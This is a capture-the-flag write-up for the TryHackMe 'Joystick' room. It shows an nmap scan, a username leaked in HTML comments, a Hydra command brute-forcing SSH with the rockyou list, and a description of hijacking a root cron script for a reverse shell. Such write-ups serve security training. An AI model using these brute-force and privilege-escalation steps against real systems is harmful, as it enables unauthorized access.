# Joystick
![alt text](https://tryhackme-images.s3.amazonaws.com/room-icons/a1f2af5e550f182a1efc6c7f0f3ff6b4.png)\n
Medium CTF room in [TryHackme](https://tryhackme.com/room/joystick)
# Reconnaissance
  - Nmap Scan
    `nmap -A -T5 -oN nmap.txt -vv <ip>`
    ```bash
    # Nmap 7.80 scan initiated Fri Jun 12 16:58:01 2020 as: nmap -A -T5 -oN nmap.txt -vv 10.10.50.224
    Warning: 10.10.50.224 giving up on port because retransmission cap hit (2).
    Nmap scan report for 10.10.50.224
    Host is up, received conn-refused (0.25s latency).
    Scanned at 2020-06-12 16:58:02 +08 for 90s
    Not shown: 728 closed ports, 269 filtered ports
    Reason: 728 conn-refused and 269 no-responses
    PORT   STATE SERVICE REASON  VERSION
    21/tcp open  ftp     syn-ack vsftpd 3.0.3
    |_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
    22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 c7:ce:5d:fa:24:68:3a:10:63:f9:28:1b:f4:6d:e5:bc (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDviekIGKBudV6eCKiRkvoK3+KbLYFlqNUkOi/nphorAqF22v/wOzvbr9hcn7/S6STJeYDHVpsKl2Ku5COzQs7zbWkv/jH9LX6R0s5pICbohVvCDjeEvdaMks9yU1/5AYj25RPi1SMLq3boEKuJiu1J+i+ADVTcE4PxvPT6rDOvh9TwVYzWuuezz8nrejAhJGvamsaaJzstZQkn+I7cY2TAeRoRJqnOmLffmNQfG2T4hDm7pg8x7nSHIStlGl3i+SZepokyPm4+rW9tKiJ9bPa9CoW7i/uT7gBFJYGNFPK8i5Rh7KIphWE7W8iMZjNE7ujTSUHnWchGyBmFihEuz777
    |   256 6b:7b:f5:12:e0:db:bb:b0:ca:f8:f8:c0:84:bc:27:e6 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAFywRYgcs+ORO0qsevRGXL7QGqLeUlNAYjDTWs7FG9hQYYA50Znen7XGzSPIY6gt57HUYp2bWD12rKLw4rcnQw=
    |   256 1b:d4:20:23:d0:5b:32:16:ad:c2:a9:cd:99:1c:e6:6e (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOVUvn4lBmcT/u4LxGHkddF39Y3bAnk8CmiVa2DGKFWU
    80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: POST OPTIONS GET HEAD
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: JoyStick Gaming
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Jun 12 16:59:32 2020 -- 1 IP address (1 host up) scanned in 91.03 seconds

    ```
# Website Enum
We can directly see a hint inside the source code.
- Source code
    ```html
        <!DOCTYPE html>
    <html lang="en" dir="ltr">
      <head>
        <meta charset="utf-8">
        <title>JoyStick Gaming</title>
      </head>
      <body>
        <p>JoyStick gaming minecraft server, open shortly to the public!</p>
        <!-- Zach, I don't care that you named your user steve. You still need to
          finish making the website -->
        <!-- Great, and now the FTP server just doesn't work. Just another great idea after
    	your failed irc chat. Why would we use that when we have in game chat? 
    	Not to mention that I know you still haven't reset your password.  -->
      </body>
    </html> 

    ```

From this we have a potential user "steve"

# User Access
To get user access we can symply brute-force the ssh login with user 'steve' and use rockyou password list
- Brute-Forcing
    Here i am going to use Hydra 
    `hydra -l steve -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <ip> ssh`
    ```bash
    [22][ssh] host: 10.10.50.224   login: steve   password: ********
    ```
    You will find the password of user steve and get user flag easily.

# Privilege Escalation

Actually to get the root.txt in this machine, we don't really need to escalate our privilege. It is because the root.txt is stored in other user's home directory.
yet we are still going to do it for the fun of it.

- Cronjob
on the crontab we can see that /opt/minecraft/backup.sh is executed as root
we can edit the file to return a reverse shell to us.

Sorry for no Screenshot of the crontab, it is just my machine was so slow.

here is the edited backup.sh and the shell we get
![alt text](https://i.imgur.com/ejkruLo.png)

So, thats all, yea thx hhh,,
